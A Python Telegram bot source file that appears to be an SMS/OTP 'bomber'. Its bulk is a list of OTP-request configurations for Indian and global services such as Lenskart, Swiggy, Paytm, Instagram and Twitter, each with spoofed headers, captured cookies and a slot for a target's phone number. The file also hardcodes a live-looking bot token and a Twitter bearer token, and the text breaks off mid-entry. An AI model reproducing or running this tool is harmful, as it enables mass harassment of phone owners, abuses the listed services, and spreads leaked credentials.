import asyncio
import aiohttp
import time
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from datetime import datetime

# Bot configuration
BOT_TOKEN = "8409322677:AAGvra5KQYXOH5ZNt9kSx7x42Lu5fjeZYtg"
ADMIN_ID = 8076046125

# Your channels with links (sirf last wale channel ka check hoga)
CHANNELS = [
    {"id": -1003124645298, "name": "➢ 𝐉𝐎𝐈𝐍 𝐇𝐄𝐑𝐖​", "link": "https://t.me/+rL16oopNfU5iYzk9"},
    {"id": -1002824712805, "name": "➢ 𝐉𝐎𝐈𝐍 𝐇𝐄𝐑𝐄", "link": "https://t.me/+XUbztPQKGScwNGNl"},
    {"id": -1002592146964, "name": "➢ 𝐉𝐎𝐈𝐍 𝐇𝐄𝐑𝐄", "link": "https://t.me/+eqtzUeGK774yMzQ1"},
    {"id": -1002967807908, "name": "➢ 𝐉𝐎𝐈𝐍 𝐇𝐄𝐑𝐄", "link": "https://t.me/rajakkhan4x"}  # Yaha pe apna channel ID daalna
]

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Global variables
running = False
current_task = None
bot_active = True
user_credits = {}

# ==================== 35+ APIs CONFIGURATION ====================
API_CONFIGS = [
    # 1. Lenskart
    {
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "X-API-Client": "mobilesite",
            "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a",
            "X-Accept-Language": "en",
            "X-B3-TraceId": "991736185845136",
            "X-Country-Code": "IN",
            "X-Country-Code-Override": "IN",
            "Sec-CH-UA-Platform": "\"Android\"",
            "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "Sec-CH-UA-Mobile": "?1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
            "Origin": "https://www.lenskart.com",
            "X-Requested-With": "pure.lite.browser",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.lenskart.com/",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
        },
        "data": lambda phone: f'{{"captcha":null,"phoneCode":"+91","telephone":"{phone}"}}'
    },
    
    # 2. GoPink Cabs
    {
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.gopinkcabs.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.gopinkcabs.com/app/cab/customer/step1.php",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Platform": "\"Android\"",
            "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "Sec-CH-UA-Mobile": "?1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
            "Cookie": "PHPSESSID=mor5basshemi72pl6d0bp21kso; mylocation=#"
        },
        "data": lambda phone: f"check_mobile_number=1&contact={phone}"
    },
    
    # 3. ShemarooMe
    {
        "url": "https://www.shemaroome.com/users/resend_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.shemaroome.com",
            "Referer": "https://www.shemaroome.com/users/sign_in",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
        },
        "data": lambda phone: f"mobile_no=%2B91{phone}"
    },
    
    # 4. KPN Fresh Web
    {
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "headers": {
            "content-length": lambda data: str(len(data)),
            "sec-ch-ua-platform": "\"Android\"",
            "cache": "no-store",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "x-channel-id": "WEB",
            "sec-ch-ua-mobile": "?1",
            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "x-user-journey-id": "2fbdb12b-feb8-40f5-9fc7-7ce4660723ae",
            "accept": "*/*",
            "origin": "https://www.kpnfresh.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.kpnfresh.com/",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "priority": "u=1, i"
        },
        "data": lambda phone: f'{{"phone_number":{{"number":"{phone}","country_code":"+91"}}}}'
    },
    
    # 5. KPN Fresh Android
    {
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST",
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "x-app-version": "3.2.6",
            "x-user-journey-id": "faf3393a-018e-4fb9-8aed-8c9a90300b88",
            "content-type": "application/json; charset=UTF-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/5.0.0-alpha.11"
        },
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
    },
    
    # 6. BikeFixUp
    {
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-encoding": "gzip",
            "host": "api.bikefixup.com",
            "client": "app",
            "content-type": "application/json; charset=UTF-8",
            "user-agent": "Dart/3.6 (dart:io)"
        },
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'
    },
    
    # 7. Rappi
    {
        "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {
            "Deviceid": "5df83c463f0ff8ff",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N Build/QP1A.190711.020)",
            "Accept-Language": "en-US",
            "Accept": "application/json",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda phone: f'{{"phone":"{phone}","country_code":"+91"}}'
    },
    
    # 8. Stratzy SMS
    {
        "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
        "method": "POST",
        "headers": {
            "sec-ch-ua-platform": "\"Android\"",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "content-type": "application/json",
            "sec-ch-ua-mobile": "?1",
            "accept": "*/*",
            "origin": "https://stratzy.in",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://stratzy.in/login",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cookie": "_fbp=fb.1.1745073074472.847987893655824745; _ga=GA1.1.2022915250.1745073078; _ga_TDMEH7B1D5=GS1.1.1745073077.1.1.1745073132.5.0.0",
            "priority": "u=1, i"
        },
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
    },
    
    # 9. Stratzy WhatsApp
    {
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {
            "sec-ch-ua-platform": "\"Android\"",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "content-type": "application/json",
            "sec-ch-ua-mobile": "?1",
            "accept": "*/*",
            "origin": "https://stratzy.in",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://stratzy.in/login",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cookie": "_fbp=fb.1.1745073074472.847987893655824745; _ga=GA1.1.2022915250.1745073078; _ga_TDMEH7B1D5=GS1.1.1745073077.1.1.1745073102.35.0.0",
            "priority": "u=1, i"
        },
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
    },
    
    # 10. Well Academy
    {
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {
            "sec-ch-ua-platform": "\"Android\"",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "accept": "application/json, text/javascript, */*; q=0.01",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "content-type": "application/json; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "origin": "https://wellacademy.in",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://wellacademy.in/store/",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cookie": "ci_session=9phtdg2os6f19dae6u8hkf3fnfthcu8e; _ga=GA1.1.229652925.1745073317; _ga_YCZKX9HKYC=GS1.1.1745073316.1.1.1745073316.0.0.0; _clck=rhb9ip%7C2%7Cfv7%7C0%7C1935; _clsk=kfjbpg%7C1745073319962%7C1%7C1%7Ch.clarity.ms%2Fcollect; cf_clearance=...; twk_idm_key=PjxT2Q-2-xzG4VIHJXn7V; twk_uuid_5f588625f0e7167d000eb093=%7B...%7D; TawkConnectionTime=0",
            "priority": "u=1, i"
        },
        "data": lambda phone: f'{{"contact_no":"{phone}"}}'
    },
    
    # 11. Hungama
    {
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "identifier": "home",
            "mlang": "en",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "alang": "en",
            "country_code": "IN",
            "vlang": "en",
            "origin": "https://www.hungama.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "Referer": "https://www.hungama.com/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","emailId":"","subject":"Register","priority":"1","device":"web","variant":"v1","templateCode":1}}'
    },
    
    # 12. Servetel
    {
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)",
            "Host": "api.servetel.in",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        },
        "data": lambda phone: f"mobile_number={phone}"
    },
    
    # 13. Meru Cab
    {
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {
            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
            "Oauthtoken": "",
            "AppVersion": "245",
            "ApiVersion": "6.2.55",
            "DeviceType": "Android",
            "DeviceId": "44098bdebb2dc047",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "24",
            "Host": "merucabapp.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/4.9.0"
        },
        "data": lambda phone: f"mobile_number={phone}"
    },
    
    # 14. BeepKart
    {
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "\"Android\"",
            "changesorigin": "product-listingpage",
            "originid": "0",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "appname": "Website",
            "userid": "0",
            "origin": "https://www.beepkart.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.beepkart.com/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"city":362,"fullName":"","phone":"{phone}","source":"myaccount","location":"","leadSourceLang":"","platform":"","consent":false,"whatsappConsent":false,"blockNotification":false,"utmSource":"","utmCampaign":"","sessionInfo":{{"sessionInfo":{{"sessionId":"d25b5a3d-72b4-4cd7-b6cb-b926a70ca08b","userId":"0","sessionRawString":"pathname=/account/new-landing&source=myaccount","referrerUrl":"/app_login?pathname=/account/new-landing&source=myaccount"}},"deviceInfo":{{"deviceRawString":"cityId=362; screen=360x800; _gcl_au=1.1.771171092.1745234524; cityName=bangalore","device_token":"PjwHFhDUVgUGYrkW29b5lGdR0kTg4kaA","device_type":"Android"}}}}'
    },
    
    # 15. Lending Plate
    {
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {
            "Host": "lendingplate.com",
            "Connection": "keep-alive",
            "Content-Length": "45",
            "sec-ch-ua-platform": "\"Android\"",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://lendingplate.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://lendingplate.com/personal-loan",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "Cookie": "_fbp=fb.1.1745235455885.251422456376518259; _gcl_au=1.1.241418330.1745235457; _gid=GA1.2.593762244.1745235461; PHPSESSID=ed051a5ea7783741eacfd602c6a192d3; _ga=GA1.1.1324264906.1745235460; _ga_MZBRRWYESB=GS1.1.1745235460.1.1.1745235474.46.0.0; moe_uuid=370f7dae-9313-4d44-8e38-efe54c437df8; _ga_KVRZ90DE3T=GS1.1.1745235460.1.1.1745235496.24.0.0"
        },
        "data": lambda phone: f"mobiles={phone}&resend=Resend&clickcount=3"
    },
    
    # 16. Snitch
    {
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "client-id": "snitch_secret",
            "Accept-Headers": "application/json",
            "Origin": "https://www.snitch.com",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.snitch.com/",
            "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
    },
    
    # 17. Dayco India
    {
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {
            "Content-Length": "61",
            "sec-ch-ua-platform": "\"Android\"",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://ekyc.daycoindia.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "Cookie": "_ga_E8YSD34SG2=GS1.1.1745236629.1.0.1745236629.60.0.0; _ga=GA1.1.1156483287.1745236629; _clck=hy49vg%7C2%7Cfv9%7C0%7C1937; PHPSESSID=tbt45qc065ng0cotka6aql88sm; _clsk=1oia3yt%7C1745236688928%7C3%7C1%7Cu.clarity.ms%2Fcollect",
            "Priority": "u=1, i"
        },
        "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
    },
    
    # 18. PenPencil
    {
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1"
        },
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    
    # 19. Otpless
    {
        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
        "method": "POST",
        "headers": {
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "Android",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "origin": "https://otpless.com",
            "sec-fetch-site": "cross-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://otpless.com/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"loginUri":"https://otpless.com/appid/0BMO1A04TAKEKDFR46DA?sdkPlatform=SHOPIFY&redirect_uri=https://imagineonline.store/account/login","origin":"https://otpless.com","deviceInfo":"{{\\"userAgent\\":\\"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36\\",\\"platform\\":\\"Linux armv81\\",\\"vendor\\":\\"Google Inc.\\",\\"browser\\":\\"Chrome\\",\\"connection\\":\\"4g\\",\\"language\\":\\"en-IN\\",\\"cookieEnabled\\":true,\\"screenWidth\\":360,\\"screenHeight\\":800,\\"screenColorDepth\\":24,\\"devicePixelRatio\\":3,\\"timezoneOffset\\":-330,\\"cpuArchitecture\\":\\"8-core\\",\\"fontFamily\\":\\"\\\\\\"Times New Roman\\\\\\"\\",\\"cHash\\":\\"82c029dd209dc895ed5cdbe212c5d67a50d3aadc918ecd24a3d06744b2e8e1f1\\"}}","browser":"Chrome","sdkPlatform":"SHOPIFY","platform":"Android","isLoginPage":true,"fingerprintJs":"{{\\"visitorId\\":\\"3bd3e9c36b55052f8c6aa470a1b7f1f7\\",\\"version\\":\\"4.6.1\\",\\"confidence\\":{{\\"score\\":0.4,\\"comment\\":\\"0.994 if upgrade to Pro: https://fpjs.dev/pro\\"}}}}","channel":"OTP","silentAuthEnabled":false,"triggerWebauthn":true,"mobile":"{phone}","value":"7029364131","selectedCountryCode":"+91","recaptchaToken":"YourRecaptchaTokenHere"}}'
    },
    
    # 20. My Imagine Store
    {
        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
        "method": "POST",
        "headers": {
            "sec-ch-ua-platform": "Android",
            "viewport-width": "360",
            "ect": "4g",
            "device-memory": "8",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "dpr": "3",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.myimaginestore.com",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.myimaginestore.com/",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "Cookie": "PHPSESSID=8trla6g5v7k3q2m1p9n4; _ga=GA1.1.123456789.1745237000"
        },
        "data": lambda phone: f"mobile={phone}"
    },

    # 21. Rapido
    {
        "url": "https://api.rapido.com/api/v3/auth/send-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Rapido/4.5.1 (Android 13; RMX3081 Build/RKQ1.211119.001)",
            "Accept": "application/json",
            "X-Client-ID": "rapido_user",
            "X-Client-Version": "4.5.1",
            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda phone: f'{{"mobile":"{phone}","country_code":"91"}}'
    },

    # 22. Ola
    {
        "url": "https://api.olacabs.com/v1/authorization/send_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Ola/7.5.1 (Android 13; RMX3081 Build/RKQ1.211119.001)",
            "X-APP-VERSION": "7.5.1",
            "X-DEVICE-ID": "android-123456789",
            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda phone: f'{{"phone":"{phone}","country_code":"+91"}}'
    },

    # 23. Uber
    {
        "url": "https://auth.uber.com/v3/signup",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Uber/4.345.10001 (Android 13; RMX3081 Build/RKQ1.211119.001)",
            "X-CSRF-Token": "x",
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda phone: f'{{"phone_number":"{phone}","country_code":"91"}}'
    },

    # 24. Swiggy
    {
        "url": "https://www.swiggy.com/dapi/auth/sms-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36",
            "x-app-version": "2.79.0",
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },

    # 25. Zomato
    {
        "url": "https://www.zomato.com/php/oauth_otp.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda phone: f'phone={phone}&otp_type=login'
    },

    # 26. Amazon
    {
        "url": "https://www.amazon.com/ap/register",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda phone: f'phoneNumber={phone}&countryCode=91'
    },

    # 27. Flipkart
    {
        "url": "https://www.flipkart.com/api/6/user/otp/generate",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36",
            "X-User-Agent": "Flipkart/3.0",
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda phone: f'{{"loginId":"{phone}","supportAllStates":true}}'
    },

    # 28. Myntra
    {
        "url": "https://www.myntra.com/gw/mobile-auth/send-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36",
            "x-mobile-auth": "true",
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },

    # 29. Paytm
    {
        "url": "https://accounts.paytm.com/signin/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36",
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
    },

    # 30. PhonePe
    {
        "url": "https://www.phonepe.com/api/v2/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36",
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
    },

    # 31. Google
    {
        "url": "https://accounts.google.com/_/signup/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda phone: f'phoneNumber=+91{phone}'
    },

    # 32. Facebook
    {
        "url": "https://www.facebook.com/login/device-based/regular/login/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda phone: f'email={phone}&pass='
    },

    # 33. Instagram
    {
        "url": "https://www.instagram.com/accounts/account_recovery_send_ajax/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda phone: f'email_or_username={phone}'
    },

    # 34. Twitter
    {
        "url": "https://api.twitter.com/1.1/onboarding/task.json",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "TwitterAndroid/9.63.0-release.0 (Linux; Android 13)",
            "Authorization": "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA",
            "Accept": "application/json",
